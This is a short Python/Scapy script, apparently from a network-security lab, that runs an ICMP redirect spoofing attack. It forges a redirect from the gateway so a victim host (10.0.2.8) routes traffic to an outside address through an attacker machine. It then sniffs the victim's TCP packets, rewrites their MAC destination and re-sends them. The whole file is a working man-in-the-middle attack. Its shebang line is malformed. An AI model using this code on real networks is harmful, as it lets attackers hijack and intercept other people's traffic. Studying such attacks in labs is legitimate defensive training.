#!usr/bin/python3
from scapy.all import *
# Sniffing and then Spoofing

def spoof_pkt_from_A(pkt):
	if pkt[IP].src == '10.0.2.8' and pkt[IP].dst == '140.82.113.3':
		pkt[Ether].dst="52:54:00:12:35:00"
		send(pkt)


def spoof_ICMP_redirect():
	IP1 = IP(src='10.0.2.1', dst='10.0.2.8')
	ICMP1 =ICMP(type=5,code=0,gw='10.0.2.7')
	IP2 = IP(src='10.0.2.8', dst='140.82.113.3')
	pkt = IP1/ICMP1/IP2/UDP()
	send(pkt)

def main():
	spoof_ICMP_redirect()
	pkt = sniff(filter='tcp',prn=spoof_pkt_from_A)


if __name__ == "__main__":
	main()